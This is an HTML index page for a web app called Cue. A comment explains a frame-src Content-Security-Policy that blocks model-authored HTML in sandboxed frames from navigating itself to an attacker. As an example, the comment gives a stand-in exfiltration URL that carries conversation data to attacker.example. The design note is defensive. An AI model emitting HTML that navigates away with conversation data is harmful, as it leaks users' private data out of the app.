<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="robots" content="noindex, nofollow" />
  <!-- viewport-fit=cover is required for iOS WKWebView to expose env(safe-area-inset-*);
       without it the Capacitor shell renders under the notch / home indicator.
       user-scalable=no + maximum-scale=1 disable pinch-zoom and the double-tap
       zoom that make a web view feel un-native; content scrolls but never scales. -->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
  <meta name="theme-color" content="#1A2230" media="(prefers-color-scheme: dark)" />
  <meta name="theme-color" content="#EAEDF2" media="(prefers-color-scheme: light)" />

  <!--
    frame-src, and only frame-src (ATL-1197). Surfaces that render
    model-authored HTML (dynamic pages, the app viewer, app-card previews) do
    so in a srcdoc frame sandboxed without `allow-same-origin`. What no CSP
    inside such a frame can express is the frame navigating its own browsing
    context: `default-src` governs subresources, and `navigate-to` was never
    shipped. A document is therefore free to send itself to
    `https://attacker.example/?d=<conversation data>`, which is egress out of
    a document that is supposed to have none.

    The embedding page is the only place that navigation can be refused, and
    `frame-src` is enforced on every navigation of a nested browsing context,
    not just its first load. srcdoc frames resolve as 'self', so the surfaces
    keep working. The web SPA shipped no CSP at all, and iOS loads this same
    deployed bundle, so both were open; the Electron shell already carries an
    equivalent header policy (apps/macos/src/main/csp.ts) and this meta must
    stay in step with its frame-src list.

    The ventureverse entries mirror the Electron policy: the parent-org app
    store is the one allowed external frame if the web inline embed ships
    (today's VV embed uses a native top-level view, not an iframe).

    *.justcue.app is the Cue Design surface (design.<instance-host>, a
    sibling subdomain — same-site but cross-origin, so 'self' does not cover
    it). Every justcue.app subdomain is Cue-owned infrastructure, so the
    ATL-1197 egress property (no navigation to attacker-controlled origins)
    is preserved. Self-host instances on custom domains fall outside that
    wildcard, so the gateway injects the deployment's DESIGN_HOST origin into
    this frame-src at serve time when it serves the shell (see
    gateway/src/http/csp-frame-src.ts) — a no-op when DESIGN_HOST is unset or
    already covered here.

    This is deliberately a single directive rather than a whole policy. A full
    CSP for the SPA is worth having, but it is a much larger change with real
    breakage surface (Google Fonts, Sentry, gateway websockets) and belongs in
    its own rollout behind report-only. Widening this list is the only reason
    to touch it: any other directive added here starts blocking things this
    comment makes no claim about.
  -->
  <meta http-equiv="Content-Security-Policy"
        content="frame-src 'self' https://www.ventureverse.com https://*.ventureverse.com https://*.justcue.app" />

  <link rel="icon" href="/favicon.svg" />
  <link rel="apple-touch-icon" href="/favicon.svg" />
  <!-- Cue brand type: DM Sans (UI) + DM Mono (eyebrows/timestamps/pills). The
       app references these families inline throughout; without loading them they
       fall back to system-ui. -->
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,300..700&family=DM+Mono:wght@400;500&display=swap" />
  <title>Cue</title>
  <script src="/theme-init.js"></script>
</head>
<body>
  <div id="root"></div>
  <!-- Branded ink boot splash; self-removes when React renders (covers the
       SPA-load gap on a cold backend so the WKWebView never flashes white). -->
  <script src="/boot-splash.js"></script>
  <script type="module" src="/src/main.tsx"></script>
</body>
</html>
